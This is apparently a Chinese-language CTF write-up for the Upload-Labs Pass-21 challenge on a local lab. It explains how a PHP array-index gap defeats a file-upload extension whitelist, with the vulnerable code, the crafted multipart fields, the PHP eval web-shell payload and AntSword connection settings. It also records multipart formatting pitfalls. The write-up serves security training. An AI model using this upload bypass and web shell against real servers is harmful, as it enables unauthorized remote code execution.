【Upload-Labs】Pass-21 数组下标空洞与 Boundary 解析实战 Writeup

操作者：何芊宏 | 操作日期：2026.11.03 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, 数组绕过, HTTP协议, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-21 (save_name 数组绕过)
  • 提示：源码支持 save_name 以数组形式传入，并对其进行拼接与后缀校验。

2. 核心原理与前置分析

本关卡的核心漏洞在于 PHP 数组下标空洞导致的计算逻辑错位。

源码获取文件后缀与拼接文件名的逻辑如下：

$file = $_POST['save_name'];
$ext = end($file); // 取数组最后一个元素作为后缀进行白名单校验
...
$file_name = reset($file) . '.' . $file[count($file) - 1]; // 拼接最终文件名

当我们在 HTTP 请求中构造一个带有“下标空洞”的数组（如只传 [0] 和 [2]，跳过 [1]）：

  1. end($file) 会获取到下标为 2 的值（如 jpg），成功通过白名单校验。
  2. 代码计算数组长度 count($file) 为 2。因此尝试获取 $file[2-1] 即 $file[1] 的值。
  3. 由于我们故意没有传 [1]，PHP 会触发 Warning 并返回空值。最终拼接出的文件名为 shell.php.（末尾带点）。
  4. Windows 系统保存文件时会自动剔除末尾的点，最终在服务器上落地为合法的 shell.php。

3. 工具配置与操作步骤

工具配置：Burp Suite 与 中国蚁剑

  • 中国蚁剑：URL 地址：http://127.0.0.1:8081/upload/shell.php；连接密码：pass；编码：UTF-8。

操作步骤与解析：

第一步：拦截请求与修改报文

在网页选择包含 Payload 的图片马（如 shell.php.jpg）上传，开启 Burp 拦截。

在请求体中，确保文件部分的 MIME 类型为 image/jpeg，并找到 save_name 字段。将其替换为两个带有下标空洞的字段：

Content-Disposition: form-data; name="save_name[0]"

shell.php
------WebKitFormBoundary...
Content-Disposition: form-data; name="save_name[2]"

jpg

确保原请求包末尾的 submit=upload 字段依然存在，随后放行。

第二步：验证与连接

页面提示“文件上传成功！”。由于 Payload 为 <?php @eval($_POST['pass']); ?>，直接访问不会回显。使用蚁剑填入该 URL 及密码 pass，成功获取服务器权限。

4. 踩坑记录与深度复盘（极其重要）

  • 致命坑1：Boundary 边界符拼写错误
    请求头中声明的是 boundary=----WebKitFormBoundary...AA1（结尾是数字 1），但在手动修改请求体时，后续字段的分隔符被误写成了 ...AAl（结尾是小写字母 L）。由于 HTTP 协议要求分隔符必须与头部声明**严格保持字节级一致**，导致 PHP 无法解析分隔符之后的表单数据，save_name 数组直接丢失，退回使用原文件名，最终落地为无法执行的图片文件。
  • 致命坑2：遗漏 submit 字段
    在手动编写/替换请求体时，删掉了 submit=upload 字段。由于外层逻辑是 if(isset($_POST['submit']))，服务端直接跳过了整个上传逻辑，导致页面无任何响应。
  • 格式坑：缺少头部与内容的空行
    在 Content-Type: image/jpeg 头部与具体文件内容 <?php ... ?> 之间，必须有一个完整的空行（CRLF）。如果缺失空行，服务端会将 PHP 代码视为 Content-Type 的续行，导致文件内容为空（0字节）。
  • 认知坑：浏览器白屏 vs 蚁剑连通
    @eval 是一个无回显的执行函数。浏览器发送的是 GET 请求，没有携带 pass 参数，代码空跑一遍，所以页面纯白（这是解析成功的表现）。而蚁剑发送的是携带了参数的 POST 请求，所以能正常通信。

5. 知识点总结

  • 数组下标空洞绕过：利用 count() 计算的索引与数组实际键名不匹配的逻辑漏洞，制造出特殊后缀（如尾随点）。
  • HTTP Multipart 协议严谨性：深入理解了 HTTP 请求头的 boundary 与 Body 中的分隔符必须完全一致，以及报文中空行的严格规范。
